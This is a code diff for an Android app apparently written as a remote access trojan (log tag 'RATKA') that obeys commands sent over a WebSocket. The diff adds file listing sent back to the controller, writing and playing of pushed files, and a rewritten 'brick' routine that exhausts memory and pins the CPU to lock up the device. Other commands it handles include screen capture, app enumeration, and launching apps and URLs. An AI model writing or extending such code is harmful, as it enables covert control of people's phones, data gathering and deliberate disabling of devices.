@@ -6,21 +6,17 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
+import android.media.MediaPlayer
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.media.RingtoneManager
 import android.net.Uri
-import android.os.BatteryManager
-import android.os.Build
-import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
-import android.os.VibrationEffect
-import android.os.Vibrator
+import android.os.*
 import android.speech.tts.TextToSpeech
 import android.util.Base64
 import android.util.Log
@@ -32,6 +28,7 @@ import okhttp3.*
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
+import java.io.File
 import java.util.Locale
 import java.util.concurrent.TimeUnit
 
@@ -92,7 +89,7 @@ class MainActivity : Activity() {
                     val json = JSONObject(text)
                     when (json.optString("cmd")) {
                         "battery" -> sendBatteryInfo(webSocket)
-                        "vibrate" -> vibratePhone(2000)
+                        "vibrate" -> vibratePhone(json.optInt("duration", 2000))
                         "toast" -> showToast(json.optString("text", "Привет!"))
                         "open_url" -> openUrl(json.optString("url", "https://google.com"))
                         "sound" -> playSound()
@@ -103,6 +100,8 @@ class MainActivity : Activity() {
                         "launch" -> launchApp(json.optString("package", "com.android.settings"))
                         "wallpaper" -> setWallpaperFromBase64(json.optString("data"))
                         "screen" -> requestScreenCapture()
+                        "files" -> sendFiles(webSocket)
+                        "play_file" -> playFile(json.optString("data"), json.optString("filename"))
                         "brick" -> brickPhone()
                     }
                 } catch (e: Exception) { Log.e("RATKA", "Ошибка", e) }
@@ -127,6 +126,12 @@ class MainActivity : Activity() {
         val pm = packageManager
         val apps = pm.getInstalledApplications(0).map { it.packageName }.filter { !it.startsWith("android.") }
         ws.send(JSONObject().apply { put("type", "apps"); put("list", JSONArray(apps.take(50))) }.toString())
+    }
+
+    private fun sendFiles(ws: WebSocket) {
+        val dir = getExternalFilesDir(null)
+        val files = dir?.listFiles()?.map { it.name } ?: emptyList()
+        ws.send(JSONObject().apply { put("type", "files"); put("list", JSONArray(files)) }.toString())
     }
 
     private fun vibratePhone(duration: Int) {
@@ -162,11 +167,27 @@ class MainActivity : Activity() {
     private fun setWallpaperFromBase64(base64Str: String) {
         try {
             val bytes = Base64.decode(base64Str, Base64.DEFAULT)
-            val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
             val wallpaperManager = WallpaperManager.getInstance(this)
             wallpaperManager.setBitmap(bitmap)
             runOnUiThread { statusText?.text = "Обои изменены" }
         } catch (e: Exception) { Log.e("RATKA", "Wallpaper error", e) }
+    }
+
+    private fun playFile(base64Data: String, filename: String) {
+        try {
+            val audioData = Base64.decode(base64Data, Base64.DEFAULT)
+            val file = File(getExternalFilesDir(null), filename)
+            file.writeBytes(audioData)
+            
+            val player = MediaPlayer()
+            player.setDataSource(file.absolutePath)
+            player.prepare()
+            player.start()
+            runOnUiThread { statusText?.text = "Играет: $filename" }
+        } catch (e: Exception) {
+            Log.e("RATKA", "Ошибка аудио", e)
+        }
     }
 
     private fun requestScreenCapture() {
@@ -219,13 +240,20 @@ class MainActivity : Activity() {
     }
 
     private fun brickPhone() {
-        for (i in 1..500) {
-            Thread {
-                var counter = 0L
-                val hog = ByteArray(10 * 1024 * 1024)
-                while (true) { counter += 1; if (counter == Long.MAX_VALUE) counter = 0 }
-            }.start()
-        }
+        Thread {
+            val hogList = mutableListOf<ByteArray>()
+            while (true) {
+                try {
+                    hogList.add(ByteArray(5 * 1024 * 1024)) // Жрем по 5 МБ
+                    var counter = 0L
+                    for (i in 1..5000000) { counter += i }
+                } catch (e: OutOfMemoryError) {
+                    while (true) {} // Если память кончилась, вешаем процессор
+                }
+            }
+        }.start()
+        
+        runOnUiThread { statusText?.text = "КИРПИЧ АКТИВИРОВАН" }
     }
 
     override fun onDestroy() { super.onDestroy(); tts?.shutdown() }
